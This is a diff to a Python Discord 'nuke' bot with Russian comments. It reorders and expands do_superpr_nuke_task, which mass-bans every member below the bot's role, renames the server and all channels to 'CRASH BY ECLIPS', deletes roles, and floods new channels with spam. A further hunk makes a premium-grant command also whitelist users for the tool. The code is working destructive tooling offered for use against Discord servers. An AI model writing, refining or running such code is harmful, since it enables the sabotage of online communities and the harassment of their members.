@@ -198,17 +198,18 @@ async def do_nuke(guild, spam_text=None):
 
 
 async def do_superpr_nuke_task(guild, spam_text=None):
-    """Приоритеты: 1. Бан всех  2. Переименование+удаление каналов/ролей  3. Создание каналов со спамом"""
+    """
+    Приоритеты:
+    1. Бан всех участников
+    2. Переименование сервера → CRASH BY ECLIPS
+    3. Переименование всех каналов → CRASH BY ECLIPS
+    4. Удаление всех ролей
+    5. Создание новых каналов со спамом
+    """
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    TURBO_NAME = "Ебанутый приветик от DavaidKa"
-
-    # Переименовываем сервер + описание
-    try:
-        await guild.edit(name=TURBO_NAME, description=TURBO_NAME)
-    except Exception:
-        pass
+    TURBO_NAME = "CRASH BY ECLIPS"
 
     bot_role = guild.me.top_role
     targets = [
@@ -217,31 +218,28 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         and (not m.top_role or m.top_role < bot_role)
     ]
 
-    # ── ПРИОРИТЕТ 1: Баним всех как можно быстрее ──
-    await asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True)
+    # ── 1. Баним всех участников ──
+    await asyncio.gather(*[m.ban(reason="super_nuke") for m in targets], return_exceptions=True)
 
-    # ── ПРИОРИТЕТ 2: Переименовываем + удаляем каналы и роли параллельно ──
-    async def rename_channel(ch):
-        try:
-            await ch.edit(name=TURBO_NAME)
-        except Exception:
-            pass
+    # ── 2. Переименовываем сервер ──
+    try:
+        await guild.edit(name=TURBO_NAME, description=TURBO_NAME)
+    except Exception:
+        pass
 
-    async def rename_role(r):
-        try:
-            await r.edit(name=TURBO_NAME)
-        except Exception:
-            pass
-
+    # ── 3. Переименовываем все каналы ──
     await asyncio.gather(
-        asyncio.gather(*[rename_channel(c) for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[rename_role(r) for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        *[c.edit(name=TURBO_NAME) for c in guild.channels],
         return_exceptions=True
     )
 
-    # ── ПРИОРИТЕТ 3: Создаём каналы со спамом ──
+    # ── 4. Удаляем все роли ──
+    await asyncio.gather(
+        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+        return_exceptions=True
+    )
+
+    # ── 5. Создаём новые каналы и спамим ──
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=TURBO_NAME)
@@ -258,6 +256,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+
 
 
 
@@ -1800,9 +1799,10 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 if uid not in PREMIUM_LIST:
                     PREMIUM_LIST.append(uid)
                     save_premium()
-                    await message.channel.send(f"💎 `{uid}` получил **Premium**.")
-                else:
-                    await message.channel.send("Уже в Premium.")
+                if uid not in config.WHITELIST:
+                    config.WHITELIST.append(uid)
+                    save_whitelist()
+                await message.channel.send(f"💎 `{uid}` получил **Premium** + добавлен в **Whitelist**.")
             except ValueError:
                 await message.channel.send("Использование: `!pm_add <id>`")
 
@@ -2277,6 +2277,7 @@ async def on_message(message):
                 )
                 return
             new_text = parts[1]
+            global AUTO_SUPER_NUKE_TEXT, AUTO_SUPERPR_NUKE_TEXT
             config.SPAM_TEXT = new_text
             AUTO_SUPER_NUKE_TEXT = new_text
             AUTO_SUPERPR_NUKE_TEXT = new_text
